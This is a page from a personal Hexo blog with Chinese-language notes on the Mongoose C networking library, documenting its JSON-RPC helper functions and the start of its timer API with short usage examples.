<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"junyiha.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="工作学习笔记">
<meta property="og:type" content="website">
<meta property="og:title" content="junyi&#39;s blog">
<meta property="og:url" content="https://junyiha.github.io/page/31/index.html">
<meta property="og:site_name" content="junyi&#39;s blog">
<meta property="og:description" content="工作学习笔记">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="zhang junyi">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://junyiha.github.io/page/31/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>junyi's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">junyi's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">hahahahaha</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_rpc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_rpc/" class="post-title-link" itemprop="url">mongoose_rpc</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>RPC(Remote Procedure Call, 远程过程调用),是一种通信协议和编程模型，用于实现分布式系统中不同节点之间的远程调用。它允许在不同计算机或进程之间像调用本地函数一样调用远程函数，隐藏了底层网络通信的细节</li>
<li>Mongoose包含一组函数，通过RPC方法简化服务器端处理。</li>
</ul>
<h2 id="struct-mg-rpc"><a href="#struct-mg-rpc" class="headerlink" title="struct mg_rpc"></a>struct mg_rpc</h2><ul>
<li><p>简介：</p>
<ul>
<li>RPC方法处理程序结构。每个方法在一个链表中都有一个入口，每个入口指向一个字符串，该字符串描述了将调用该方法的模式，以及为满足该方法调用而调用的函数，并带有一个适当的函数参数。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_rpc</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_rpc</span> *next;              <span class="comment">// Next in list</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_str</span> method;             <span class="comment">// Method pattern</span></span><br><span class="line">  <span class="built_in">void</span> (*fn)(<span class="keyword">struct</span> mg_rpc_req *);  <span class="comment">// Handler function</span></span><br><span class="line">  <span class="type">void</span> *fn_data;                    <span class="comment">// Handler function argument</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="struct-mg-rpc-req"><a href="#struct-mg-rpc-req" class="headerlink" title="struct mg_rpc_req"></a>struct mg_rpc_req</h2><ul>
<li><p>简介：</p>
<ul>
<li>RPC请求描述符。被调用的方法会收到一个包含请求的描述符，以及一个指向函数的指针，该函数将被调用来打印输出响应，并带有一个适当的函数参数；例如：mg_pfn_realloc() 或 mg_pfn_iobuf()</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_rpc_req</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_rpc</span> **head;  <span class="comment">// RPC handlers list head</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_rpc</span> *rpc;    <span class="comment">// RPC handler being called</span></span><br><span class="line">  <span class="type">mg_pfn_t</span> pfn;          <span class="comment">// Response printing function</span></span><br><span class="line">  <span class="type">void</span> *pfn_data;        <span class="comment">// Response printing function data</span></span><br><span class="line">  <span class="type">void</span> *req_data;        <span class="comment">// Arbitrary request data</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_str</span> frame;   <span class="comment">// Request, e.g. &#123;&quot;id&quot;:1,&quot;method&quot;:&quot;add&quot;,&quot;params&quot;:[1,2]&#125;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-rpc-add"><a href="#mg-rpc-add" class="headerlink" title="mg_rpc_add"></a>mg_rpc_add</h2><ul>
<li><p>简介：</p>
<ul>
<li>将方法method_pattern添加到RPC方法列表的头部。调用该方法将调用handler，并将handler_data与请求一起传递给它(如下使用示例中的r-&gt;fn_data)。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_add</span><span class="params">(<span class="keyword">struct</span> mg_rpc **head, <span class="keyword">struct</span> mg_str method_pattern,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="type">void</span> (*handler)(<span class="keyword">struct</span> mg_rpc_req *), <span class="type">void</span> *handler_data)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>head – 链表指针</li>
<li>method_pattern – 方法的名称</li>
<li>handler – 执行该方法操作的RPC函数</li>
<li>handler_data – 任意函数数据</li>
</ul>
</li>
<li><p>注：</p>
<ul>
<li>如果method_pattern为空字符串，该处理程序将被调用来处理JSON-RPC响应。如果JSON请求是由双方发起的，那么处理响应可能是必要的。</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_rpc</span> *s_rpc_head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">rpc_sum</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *r)</span> </span>&#123;</span><br><span class="line">  <span class="type">double</span> a = <span class="number">0.0</span>, b = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">mg_json_get_num</span>(r-&gt;frame, <span class="string">&quot;$.params[0]&quot;</span>, &amp;a);</span><br><span class="line">  <span class="built_in">mg_json_get_num</span>(r-&gt;frame, <span class="string">&quot;$.params[1]&quot;</span>, &amp;b);</span><br><span class="line">  <span class="built_in">mg_rpc_ok</span>(r, <span class="string">&quot;%g&quot;</span>, a + b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">rpc_mul</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *r)</span> </span>&#123;<span class="comment">//...&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">mg_rpc_add</span>(&amp;s_rpc_head, <span class="built_in">mg_str</span>(<span class="string">&quot;sum&quot;</span>), rpc_sum, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">mg_rpc_add</span>(&amp;s_rpc_head, <span class="built_in">mg_str</span>(<span class="string">&quot;mul&quot;</span>), rpc_mul, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-rpc-del"><a href="#mg-rpc-del" class="headerlink" title="mg_rpc_del"></a>mg_rpc_del</h2><ul>
<li><p>简介：</p>
<ul>
<li>从RPC方法列表中删除带有RPC函数处理程序的方法</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_del</span><span class="params">(<span class="keyword">struct</span> mg_rpc **head, <span class="type">void</span> (*handler)(<span class="keyword">struct</span> mg_rpc_req *))</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>head – 链表指针</li>
<li>handler – RPC函数处理程序的方法，使用NULL删除全部</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_rpc</span> *s_rpc_head = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// add methods</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Time to cleanup</span></span><br><span class="line"><span class="built_in">mg_rpc_del</span>(&amp;s_rpc_head, rpc_mul);    <span class="comment">// Deallocate specific handler</span></span><br><span class="line"><span class="built_in">mg_rpc_del</span>(&amp;s_rpc_head, <span class="literal">NULL</span>);       <span class="comment">// Deallocate all RPC handlers</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-rpc-process"><a href="#mg-rpc-process" class="headerlink" title="mg_rpc_process"></a>mg_rpc_process</h2><ul>
<li><p>简介：</p>
<ul>
<li>为这个请求调用合适的方法。如果请求的方法不存在，将调用mg_rpc_err()并打印错误提示。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_process</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *req)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>req – 一个请求</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_rpc</span> *s_rpcs = <span class="literal">NULL</span>;                               <span class="comment">// Empty RPC list head</span></span><br><span class="line"><span class="built_in">mg_rpc_add</span>(&amp;s_rpcs, <span class="built_in">mg_str</span>(<span class="string">&quot;rpc.list&quot;</span>), mg_rpc_list, <span class="literal">NULL</span>); <span class="comment">// Add rpc.list</span></span><br><span class="line"><span class="comment">// ... add more RPC methods</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// On request, process the incoming frame</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> req = <span class="built_in">mg_str</span>(<span class="string">&quot;&#123;\&quot;id\&quot;:1,\&quot;method\&quot;:\&quot;sum\&quot;,\&quot;params\&quot;:[1,2]&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_iobuf</span> io = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">512</span>&#125;;  <span class="comment">// Empty IO buf, with 512 realloc granularity</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_rpc_req</span> r = &#123;</span><br><span class="line">  .head = &amp;s_rpcs,        <span class="comment">// RPC list head</span></span><br><span class="line">  .rpc = <span class="literal">NULL</span>,            <span class="comment">// This will be set by mg_rpc_process()</span></span><br><span class="line">  .pfn = mg_pfn_iobuf,    <span class="comment">// Printing function: print into the io buffer</span></span><br><span class="line">  .pfn_data = &amp;io,        <span class="comment">// Pass our io buffer as a parameter</span></span><br><span class="line">  .req_data = <span class="literal">NULL</span>,       <span class="comment">// No specific request data</span></span><br><span class="line">  .frame = req,           <span class="comment">// Specify incoming frame</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">mg_rpc_process</span>(&amp;r);</span><br><span class="line"><span class="keyword">if</span> (io.buf != <span class="literal">NULL</span>) <span class="built_in">printf</span>(<span class="string">&quot;Response: %s\n&quot;</span>, (<span class="type">char</span> *) io.buf);</span><br><span class="line"><span class="built_in">mg_iobuf_free</span>(&amp;io);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-rpc-ok-mg-rpc-vok"><a href="#mg-rpc-ok-mg-rpc-vok" class="headerlink" title="mg_rpc_ok, mg_rpc_vok"></a>mg_rpc_ok, mg_rpc_vok</h2><ul>
<li><p>简介：</p>
<ul>
<li>打印结果帧的辅助函数</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_ok</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_vok</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *, <span class="type">const</span> <span class="type">char</span> *fmt, va_list *ap)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>req – 一个请求</li>
<li>fmt – 使用printf语义格式化的字符串</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">rpc_sum</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *r)</span> </span>&#123;</span><br><span class="line">  <span class="type">double</span> a = <span class="number">0.0</span>, b = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">mg_json_get_num</span>(r-&gt;frame, <span class="string">&quot;$.params[0]&quot;</span>, &amp;a);</span><br><span class="line">  <span class="built_in">mg_json_get_num</span>(r-&gt;frame, <span class="string">&quot;$.params[1]&quot;</span>, &amp;b);</span><br><span class="line">  <span class="built_in">mg_rpc_ok</span>(r, <span class="string">&quot;%g&quot;</span>, a + b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-rpc-err-mg-rpc-verr"><a href="#mg-rpc-err-mg-rpc-verr" class="headerlink" title="mg_rpc_err, mg_rpc_verr"></a>mg_rpc_err, mg_rpc_verr</h2><ul>
<li><p>简介：</p>
<ul>
<li>打印错误帧的辅助函数</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_err</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *, <span class="type">int</span> code, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_verr</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *, <span class="type">int</span> code, <span class="type">const</span> <span class="type">char</span> *fmt, va_list *)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>req – 一个请求</li>
<li>fmt – 使用printf语义格式化的字符串</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">rpc_dosome</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *r)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">mg_rpc_err</span>(r, <span class="number">-32109</span>, <span class="string">&quot;\&quot;%.*s not found\&quot;&quot;</span>, len, &amp;r-&gt;frame.ptr[offset]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-rpc-list"><a href="#mg-rpc-list" class="headerlink" title="mg_rpc_list"></a>mg_rpc_list</h2><ul>
<li><p>简介：</p>
<ul>
<li>内置RPC方法，用于列出所有已注册的RPC方法。该函数通常不直接调用，而是作为方法注册。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_list</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *r)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>req – 一个请求</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mg_rpc_add</span>(&amp;s_rpc_head, <span class="built_in">mg_str</span>(<span class="string">&quot;rpc.list&quot;</span>), mg_rpc_list, &amp;s_rpc_head);</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_timer/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_timer/" class="post-title-link" itemprop="url">mongoose_timer</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>mongoose工具的计时器相关笔记</li>
</ul>
<h2 id="struct-mg-timer"><a href="#struct-mg-timer" class="headerlink" title="struct mg_timer"></a>struct mg_timer</h2><ul>
<li><p>简介：</p>
<ul>
<li>计时器结构体。描述一个软件计时器。计时器粒度与主事件循环中的<code>mg_mgr_poll()</code>的超时参数相同</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_timer</span> &#123;</span></span><br><span class="line">  <span class="type">uint64_t</span> period_ms;       <span class="comment">// Timer period in milliseconds</span></span><br><span class="line">  <span class="type">uint64_t</span> expire;          <span class="comment">// Expiration timestamp in milliseconds</span></span><br><span class="line">  <span class="type">unsigned</span> flags;           <span class="comment">// Possible flags values below</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MG_TIMER_ONCE 0     <span class="comment">// Call function once</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MG_TIMER_REPEAT 1   <span class="comment">// Call function periodically</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MG_TIMER_RUN_NOW 2  <span class="comment">// Call immediately when timer is set</span></span></span><br><span class="line">  <span class="type">void</span> (*fn)(<span class="type">void</span> *);       <span class="comment">// Function to call</span></span><br><span class="line">  <span class="type">void</span> *arg;                <span class="comment">// Function argument</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_timer</span> *<span class="title">next</span>;</span>    <span class="comment">// Linkage</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-timer-add"><a href="#mg-timer-add" class="headerlink" title="mg_timer_add"></a>mg_timer_add</h2><ul>
<li><p>简介：</p>
<ul>
<li>设置一个计时器。这是一个高级计时器API，允许将软件计时器添加到活动管理器。</li>
<li>这个函数使用<code>calloc()</code>一个新的计时器，并将它添加到<code>mgr-&gt;timers</code>列表中。</li>
<li>当调用<code>mg_mgr_poll()</code>时，所有添加的计时器均进行轮询，并在计时器到期时调用计时器设定的函数</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> mg_timer *<span class="title function_">mg_timer_add</span><span class="params">(<span class="keyword">struct</span> mg_mgr *mgr, <span class="type">uint64_t</span> period_ms, <span class="type">unsigned</span> flags, <span class="type">void</span> (*fn)(<span class="type">void</span> *), <span class="type">void</span> *fn_data)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>mgr</code>   –  指向事件管理器的结构体指针</li>
<li><code>ms</code>    –  一个时间间隔，以毫秒为单位</li>
<li><code>flags</code> –  计时器标志掩码：<code>MG_TIMER_REPEAT</code>和<code>MG_TIMER_RUN_NOW</code></li>
<li><code>fn</code>    –  函数调用</li>
<li><code>fn_data</code>  –  调用的函数参数</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>返回一个指向创建的计时器的指针</li>
</ul>
</li>
<li><p>详解：</p>
<ul>
<li>确保计时器的间隔等于或大于<code>mg_mgr_poll()</code>的超时时间</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">timer_fn</span><span class="params">(<span class="type">void</span> *data)</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mg_timer_add(mgr, <span class="number">1000</span>, MG_TIMER_REPEAT, timer_fn, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-timer-init"><a href="#mg-timer-init" class="headerlink" title="mg_timer_init"></a>mg_timer_init</h2><ul>
<li><p>简介：</p>
<ul>
<li>设置一个计时器</li>
</ul>
</li>
<li><p>原型：</p>
